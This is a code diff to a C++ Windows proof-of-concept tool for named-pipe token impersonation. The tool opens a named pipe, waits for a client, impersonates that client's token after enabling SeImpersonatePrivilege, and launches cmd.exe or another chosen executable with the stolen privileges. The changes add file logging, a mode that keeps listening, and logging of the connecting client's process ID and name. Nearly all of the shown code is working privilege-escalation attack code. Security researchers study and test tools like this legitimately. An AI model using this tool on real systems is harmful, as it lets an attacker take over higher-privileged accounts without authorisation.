@@ -12,8 +12,12 @@
 #include <fstream>
 #include <aclapi.h>
 #include <sddl.h>
+#include <psapi.h>
 
 #define BUFSIZE 0x1000
+
+BOOL logToFile = FALSE;
+std::wstring logfilePath;
 
 
 PCHAR wideStringToNarrow(PWCHAR originalWide) {
@@ -106,7 +110,8 @@ std::wstring GetLastErrorStdStr() {
 
 BOOL EnableWindowsPrivilege(LPCWSTR Privilege)
 {
-	/* Tries to enable privilege if it is present to the Permissions set. */
+	// Tries to enable privilege if it is present to the Permissions set
+
 	LUID luid = {};
 	TOKEN_PRIVILEGES tp;
 	HANDLE currentProcess = GetCurrentProcess();
@@ -123,7 +128,8 @@ BOOL EnableWindowsPrivilege(LPCWSTR Privilege)
 
 BOOL CheckWindowsPrivilege(LPCWSTR Privilege)
 {
-	/* Checks for Privilege and returns True or False. */
+	// Checks for Privilege and returns True or False
+
 	LUID luid;
 	PRIVILEGE_SET privs;
 	HANDLE hProcess;
@@ -297,46 +303,117 @@ exit:
 }
 
 
+std::wstring GetProcessNameFromPID(DWORD processID)
+{
+	std::wstring pname = L"unknown";
+	WCHAR szProcessName[MAX_PATH];
+
+	// Get a handle to the process.
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_READ,
+		FALSE, processID);
+
+	// Get the process name.
+
+	if (NULL != hProcess)
+	{
+		HMODULE hMod;
+		DWORD cbNeeded;
+
+		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
+			&cbNeeded))
+		{
+			GetModuleFileNameExW(hProcess, hMod, szProcessName, MAX_PATH);
+			pname = std::wstring(szProcessName);
+		}
+	}
+	else {
+		std::wcout << "can not open client process; " << GetLastErrorStdStr() << "\n";
+	}
+
+	CloseHandle(hProcess);
+	return pname.c_str();
+}
+
+
+// class to log output to both stdout and logfile
+class DoubleOutSteam {
+public:
+
+	std::wofstream logFileStream;
+
+	DoubleOutSteam() {
+
+	}
+
+	DoubleOutSteam(std::wstring logFilePath) {
+		logFileStream = std::wofstream(logFilePath, std::ofstream::out | std::ofstream::app);
+		logFileStream.flush();
+	}
+
+	void close() {
+		logFileStream.close();
+	}
+};
+
+
+template <class T>
+DoubleOutSteam& operator<< (DoubleOutSteam& st, T val)
+{
+	if (logToFile) {
+		st.logFileStream << val;
+	}
+	std::wcout << val;
+	return st;
+}
+
+
 void printUsage(wchar_t* argv[]) {
-	std::wcout << "usage: " << argv[0] << " -p <full pipe name> [-e <full path to executable>]\n";
+	std::wcout << "usage: " << argv[0] << " -p <full pipe name> [options] [-e <full path to executable>]\n";
 	std::wcout << "options:\n";
 	std::wcout << "\t-p,--pipe: path to the named pipe\n";
 	std::wcout << "\t-e,--executable: path to the executable to run with the impersonated token's privileges; default = cmd.exe\n";
 	std::wcout << "\t-u,--user: username to target; default = any\n";
-	std::wcout << "\t-o,--outfile: output log file path; default = C:\\NamedPipeTokenImpersonationPOC.log\n";
+	std::wcout << "\t-l,--logfile: output log file path\n";
+	std::wcout << "\t-k,--keep: keep listening on the pipe; does not run the executable specified with --executable\n";
 }
 
 
 int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 
 	BOOL fConnected = FALSE;
+	BOOL keepListening = FALSE;
 	DWORD dwThreadId = 0;
 	HANDLE hPipe = INVALID_HANDLE_VALUE;
 	LPCTSTR lpszPipename = NULL;
 	PWCHAR targetUser = NULL;
 	PWCHAR payloadExec = (PWCHAR)L"C:\\Windows\\System32\\cmd.exe";
-	std::wstring logfilePath = L"C:\\NamedPipeTokenImpersonationPOC.log";
 	std::stringstream logString;
+	DoubleOutSteam dout;
 
 
 	for (int i = 1; i < argc; i++) {
 		if (wcscmp(argv[i], L"-p") == 0 || wcscmp(argv[i], L"--pipe") == 0) {
-			lpszPipename = argv[i + 1];
+			lpszPipename = argv[++i];
 		}
 		else if (wcscmp(argv[i], L"-e") == 0 || wcscmp(argv[i], L"--executable") == 0) {
-			payloadExec = argv[i + 1];
+			payloadExec = argv[++i];
 		}
 		else if (wcscmp(argv[i], L"-u") == 0 || wcscmp(argv[i], L"--username") == 0) {
-			targetUser = argv[i + 1];
+			targetUser = argv[++i];
 		}
-		else if (wcscmp(argv[i], L"-o") == 0 || wcscmp(argv[i], L"--outfile") == 0) {
-			logfilePath = std::wstring(argv[i + 1]);
+		else if (wcscmp(argv[i], L"-l") == 0 || wcscmp(argv[i], L"--logfile") == 0) {
+			logToFile = TRUE;
+			logfilePath = std::wstring(argv[++i]);
+		}
+		else if (wcscmp(argv[i], L"-k") == 0 || wcscmp(argv[i], L"--keep") == 0) {
+			keepListening = TRUE;
 		}
 		else {
 			printUsage(argv);
 			return 1;
 		}
-		i++;
 	}
 
 	if (lpszPipename == NULL) {
@@ -345,17 +422,17 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 		return 1;
 	}
 
-	std::wofstream logout(logfilePath, std::ofstream::out | std::ofstream::app);
+	if (logToFile) {
+		dout = DoubleOutSteam(logfilePath);
+	}
 
 	if (!CheckWindowsPrivilege(SE_IMPERSONATE_NAME)) {
-		std::wcout << "No SeImpersonatePrivilege is granted!";
-		logout << "No SeImpersonatePrivilege is granted!";
+		dout << "No SeImpersonatePrivilege is granted!";
 		return 1;
 	}
 
 	if (!EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
-		std::wcout << "EnableWindowsPrivilege error!";
-		logout << "EnableWindowsPrivilege!";
+		dout << "EnableWindowsPrivilege error!";
 		return 1;
 	}
 
@@ -382,15 +459,12 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 			&sa);                    // default security attribute 
 
 		if (hPipe == INVALID_HANDLE_VALUE) {
-			std::wcout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
-			std::wcout << "Is another instance of " << lpszPipename << " already running?\n";
-			logout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
-			logout << "Is another instance of " << lpszPipename << " already running?\n";
+			dout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
+			dout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
 			return 1;
 		}
 
-		std::wcout << "\nAwaiting client connection on " << lpszPipename << "\n";
-		logout << "\nAwaiting client connection on " << lpszPipename << "\n";
+		dout << "\nAwaiting client connection on " << lpszPipename << "\n";
 
 		// wait for the client to connect
 
@@ -398,8 +472,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 			TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
 
 		if (fConnected) {
-			std::wcout << "Client connected\n";
-			logout << "Client connected\n";
+			dout << "Client connected\n";
 
 			DWORD cbBytesRead = 0;
 			BOOL fSuccess = FALSE;
@@ -418,25 +491,21 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 
 			if (!fSuccess || cbBytesRead == 0) {
 				if (GetLastError() == ERROR_BROKEN_PIPE) {
-					std::wcout << "InstanceThread: client disconnected.\n";
-					logout << "InstanceThread: client disconnected.\n";
+					dout << "InstanceThread: client disconnected.\n";
 				}
 				else {
-					std::wcout << "InstanceThread ReadFile failed; " << GetLastErrorStdStr() << "\n";
-					logout << "InstanceThread ReadFile failed; " << GetLastErrorStdStr() << "\n";
+					dout << "InstanceThread ReadFile failed; " << GetLastErrorStdStr() << "\n";
 				}
 				CloseHandle(hPipe);
 				continue;
 			}
 
 			if (ImpersonateNamedPipeClient(hPipe) == 0) {
-				std::wcout << "ImpersonateNamedPipeClient failed; " << GetLastErrorStdStr() << "\n";
-				logout << "ImpersonateNamedPipeClient failed; " << GetLastErrorStdStr() << "\n";
+				dout << "ImpersonateNamedPipeClient failed; " << GetLastErrorStdStr() << "\n";
 			}
 			else {
 
-				std::wcout << "ImpersonateNamedPipeClient succeeded!\n";
-				logout << "ImpersonateNamedPipeClient succeeded!\n";
+				dout << "ImpersonateNamedPipeClient succeeded!\n";
 
 				HANDLE threadToken;
 
@@ -446,8 +515,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 					FALSE,
 					&threadToken
 				) == 0) {
-					std::wcout << "OpenThreadToken failed; " << GetLastErrorStdStr() << "\n";
-					logout << "OpenThreadToken failed; " << GetLastErrorStdStr() << "\n";
+					dout << "OpenThreadToken failed; " << GetLastErrorStdStr() << "\n";
 					CloseHandle(hPipe);
 					continue;
 				}
@@ -456,26 +524,21 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 
 				DWORD impersonationLevel = getTokenImpersonationLevel(threadToken);
 				if (impersonationLevel == -1) {
-					std::wcout << "can not get impersonation level\n";
-					logout << "can not get impersonation level\n";
+					dout << "can not get impersonation level\n";
 				}
 				else {
 					switch ((SECURITY_IMPERSONATION_LEVEL)impersonationLevel) {
 					case SecurityAnonymous:
-						std::wcout << "Token level: SecurityAnonymous\n";
-						logout << "Token level: SecurityAnonymous\n";
+						dout << "Token level: SecurityAnonymous\n";
 						break;
 					case SecurityIdentification:
-						std::wcout << "Token level: SecurityIdentification\n";
-						logout << "Token level: SecurityIdentification\n";
+						dout << "Token level: SecurityIdentification\n";
 						break;
 					case SecurityImpersonation:
-						std::wcout << "Token level: SecurityImpersonation\n";
-						logout << "Token level: SecurityImpersonation\n";
+						dout << "Token level: SecurityImpersonation\n";
 						break;
 					case SecurityDelegation:
-						std::wcout << "Token level: SecurityDelegation\n";
-						logout << "Token level: SecurityDelegation\n";
+						dout << "Token level: SecurityDelegation\n";
 						break;
 					default:
 						break;
@@ -486,19 +549,27 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 
 				std::wstring tokenSidString = getTokenSidString(threadToken);
 				if (!tokenSidString.empty()) {
-					std::wcout << "Token user SID: " << tokenSidString << "\n";
-					logout << "Token user SID: " << tokenSidString << "\n";
+					dout << "Token user SID: " << tokenSidString << "\n";
 				}
 
 				// get token user
 
 				std::wstring tokenUsernameString = getNameFromSid(threadToken);
 				if (!tokenUsernameString.empty()) {
-					std::wcout << "Token username: " << tokenUsernameString << "\n";
-					logout << "Token username: " << tokenUsernameString << "\n";
+					dout << "Token username: " << tokenUsernameString << "\n";
 				}
 
 				if ((targetUser == NULL) || (targetUser != NULL && strstr_i((PWCHAR)tokenUsernameString.c_str(), targetUser))) {
+
+					ULONG cpid = 0;
+					GetNamedPipeClientProcessId(hPipe, &cpid);
+					dout << L"PID: " << cpid << L"\n";
+					std::wstring cname = GetProcessNameFromPID(cpid);
+					dout << L"Process name: " << cname.c_str() << L"\n";
+
+					if (keepListening) {
+						continue;
+					}
 
 					STARTUPINFOW si;
 					PROCESS_INFORMATION pi;
@@ -521,8 +592,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 						&si,
 						&pi
 					) == 0) {
-						std::wcout << "CreateProcessWithTokenW failed; " << GetLastErrorStdStr() << "\n";
-						logout << "CreateProcessWithTokenW failed; " << GetLastErrorStdStr() << "\n";
+						dout << "CreateProcessWithTokenW failed; " << GetLastErrorStdStr() << "\n";
 						CloseHandle(hPipe);
 						continue;
 					}
@@ -531,8 +601,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 					done = TRUE;
 				}
 				else {
-					std::wcout << "Skipping... \n\n";
-					logout << "Skipping... \n\n";
+					dout << "Skipping... \n\n";
 				}
 			}
 			
@@ -541,6 +610,6 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
 		CloseHandle(hPipe);
 	}
 	free(pchRequest);
-	logout.close();
+	dout.close();
 	return 0;
 }
